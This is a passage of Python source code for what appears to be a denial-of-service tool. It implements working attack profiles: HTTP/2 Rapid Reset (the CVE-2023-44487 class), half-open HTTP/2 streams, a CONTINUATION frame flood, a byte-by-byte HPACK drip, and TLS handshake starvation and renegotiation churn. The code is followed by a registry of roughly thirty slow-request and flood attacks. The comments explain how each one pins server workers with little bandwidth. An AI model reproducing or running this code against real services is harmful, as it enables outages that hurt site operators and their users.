        return not stop.is_set()


class H2RapidReset(Profile):
    name = "h2-rapid-reset"

    async def run(self, reader, writer, config, ua, stats, stop):
        # HTTP/2 Rapid Reset (CVE-2023-44487 class): on one connection, open a
        # continuous stream of requests and RST_STREAM each immediately after
        # sending its (complete) HEADERS. The server allocates then tears down
        # per-stream state far faster than it can serve, exhausting workers with
        # almost no bandwidth. Headers/frames are hand-built in h2.py (no crates).
        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
        authority = config.header_host
        method = config.method or "GET"
        stream_id = 1
        while not stop.is_set():
            burst = bytearray()
            for _ in range(512):
                block = h2.request_block(method, _path(config), authority, extra={"user-agent": ua})
                burst += h2.frame(stream_id, h2.HEADERS, h2.END_HEADERS | h2.END_STREAM, block)
                burst += h2.rst_stream(stream_id, h2.NO_ERROR)
                stream_id += 2
                if stream_id > 0x7FFFFFF0:
                    stream_id = 1
            await _write(writer, bytes(burst), stats, config)
            await _drain_responses(reader, stats)
        return not stop.is_set()


class H2SlowStreams(Profile):
    name = "h2-slow-streams"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Open many streams whose HEADERS omit END_STREAM (so each awaits a
        # request body), then trickle a byte of DATA onto them forever without
        # ever finishing a stream. Every half-open stream pins per-stream
        # bookkeeping / flow-control state on the target.
        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
        authority = config.header_host
        streams: list[int] = []
        for _ in range(32):
            sid = 1 + 2 * len(streams)
            block = h2.request_block(
                "POST", _path(config), authority, extra={"content-type": "application/octet-stream"}
            )
            await _write(writer, h2.frame(sid, h2.HEADERS, h2.END_HEADERS, block), stats, config)
            streams.append(sid)
        while not stop.is_set():
            for sid in streams:
                await _write(writer, h2.data(sid, _dribble()), stats, config)
                await _drain_responses(reader, stats)
                if stop.is_set():
                    break
            await _halt(stop, config)
        return not stop.is_set()


class H2ContinuationFlood(Profile):
    name = "h2-continuation-flood"

    async def run(self, reader, writer, config, ua, stats, stop):
        # Flood the frame-reassembly layer: start a header block with a HEADERS
        # frame whose END_HEADERS is clear, then keep the block open with an
        # unbounded run of CONTINUATION frames (which RFC 7540 requires to
        # immediately follow, so nothing else can be interleaved). The header
        # block is never completed, so the server keeps buffering reassembled
        # header state and counting an ever-growing number of frames.
        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
        sid = 1
        first = h2.header_field(":method", config.method or "GET")
        await _write(writer, h2.frame(sid, h2.HEADERS, 0, first), stats, config)
        frag = h2.header_field("x-flood", _rand_token(8))
        n = 0
        while not stop.is_set():
            chunk = bytearray()
            for _ in range(256):
                chunk += h2.continuation(sid, frag)
                n += 1
            await _write(writer, bytes(chunk), stats, config)
            await _drain_responses(reader, stats)
            if n % 2048 == 0:
                await _halt(stop, config)
        return not stop.is_set()


class H2HpackDrip(Profile):
    name = "h2-hpack-drip"

    async def run(self, reader, writer, config, ua, stats, stop):
        # The HTTP/2 analogue of slowloris, done at the framing/HPACK layer: build
        # one valid request header block, then feed it to the server a single
        # octet per frame - one byte in HEADERS, then one byte per CONTINUATION -
        # with a random delay between, setting END_HEADERS only on the final byte.
        # A stalled drip leaves an incomplete header block pinned; a completed one
        # (POST, no END_STREAM) leaves the stream waiting for a body.
        await _write(writer, h2.PREFACE + h2.settings() + h2.settings_ack(), stats, config)
        block = h2.request_block(
            config.method or "POST",
            _path(config),
            config.header_host,
            extra={"user-agent": ua, "accept": random.choice(_ACCEPTS)},
        )
        sid = 1
        await _write(writer, h2.frame(sid, h2.HEADERS, 0, block[:1]), stats, config)
        rest = block[1:]
        for i, byte in enumerate(rest):
            if stop.is_set():
                return False
            last = i == len(rest) - 1
            await _write(
                writer,
                h2.continuation(sid, bytes([byte]), end_headers=last),
                stats,
                config,
            )
            await _halt(stop, config)
        # Block complete but no body/END_STREAM; hold the stream open.
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


class TlsSlowHello(Profile):
    name = "tls-slow-hello"

    async def run(self, reader, writer, config, ua, stats, stop):
        # TLS handshake starvation (the TLS-layer analogue of slowloris): announce
        # a handshake *record* whose declared length far exceeds the bytes we ever
        # deliver, open a ClientHello inside it, then dribble a few body bytes at a
        # random delay and never complete the record. The server sizes its
        # handshake reassembly buffer from the record length and blocks in that
        # read, pinning a handshake worker/connection slot at near-zero bandwidth.
        # TLS bytes are hand-built in tls.py (no crates); the socket is left raw
        # (target an ``http://host:port`` reaching the TLS listener directly).
        announce = tls.starved_client_hello(secrets.token_bytes(32))
        await _announce_then_dribble(writer, stats, config, stop, announce, count=32)
        # Record never completed; hold the socket so the pinned buffer stays live.
        while not stop.is_set():
            await _halt(stop, config)
        return not stop.is_set()


class TlsRenegoHold(Profile):
    name = "tls-renego-hold"

    async def run(self, reader, writer, config, ua, stats, stop):
        # (Re)handshake-initiation churn: a fresh ClientHello is what a client
        # sends to start (or renegotiate) a TLS session, forcing the server to
        # allocate handshake state and, on completion, run expensive asymmetric
        # crypto. Here we repeatedly emit a new starved ClientHello record - each a
        # fresh handshake initiation - dribbling a byte and never completing any
        # one, so the server re-enters its handshake state machine and pins
        # renegotiation/handshake buffers over and over on a single connection.
        while not stop.is_set():
            announce = tls.starved_client_hello(
                secrets.token_bytes(32),
                declared_record_len=2048,
                header_body_bytes=6,
            )
            await _write(writer, announce, stats, config)
            for _ in range(8):
                if stop.is_set():
                    return False
                await _write(writer, _dribble(), stats, config)
                await _halt(stop, config)
            await _drain_responses(reader, stats)
        return not stop.is_set()


PROFILES: dict[str, type[Profile]] = {
    SlowPost.name: SlowPost,
    SlowPostHeaders.name: SlowPostHeaders,
    SlowHeaders.name: SlowHeaders,
    SlowRead.name: SlowRead,
    Chunked.name: Chunked,
    WebSocketSlowUpgrade.name: WebSocketSlowUpgrade,
    HttpPipelining.name: HttpPipelining,
    RangeHeaderAbuse.name: RangeHeaderAbuse,
    CookieBomb.name: CookieBomb,
    JsonRpcSlow.name: JsonRpcSlow,
    SmtpSlowEnvelope.name: SmtpSlowEnvelope,
    FtpSlowCommand.name: FtpSlowCommand,
    MultipartSlowUpload.name: MultipartSlowUpload,
    ExpectContinueAbuse.name: ExpectContinueAbuse,
    ImapSlowLiteral.name: ImapSlowLiteral,
    RedisRespSlow.name: RedisRespSlow,
    PostgresStartupSlow.name: PostgresStartupSlow,
    DnsTcpSlow.name: DnsTcpSlow,
    NntpSlowPost.name: NntpSlowPost,
    IdleHold.name: IdleHold,
    SlowXml.name: SlowXml,
    SlowFormParse.name: SlowFormParse,
    HeaderCountFlood.name: HeaderCountFlood,
    WebSocketSlowFrame.name: WebSocketSlowFrame,
    ReqSmugglingProbe.name: ReqSmugglingProbe,
    H2RapidReset.name: H2RapidReset,
    H2SlowStreams.name: H2SlowStreams,
    H2ContinuationFlood.name: H2ContinuationFlood,
    H2HpackDrip.name: H2HpackDrip,
    TlsSlowHello.name: TlsSlowHello,
    TlsRenegoHold.name: TlsRenegoHold,
}
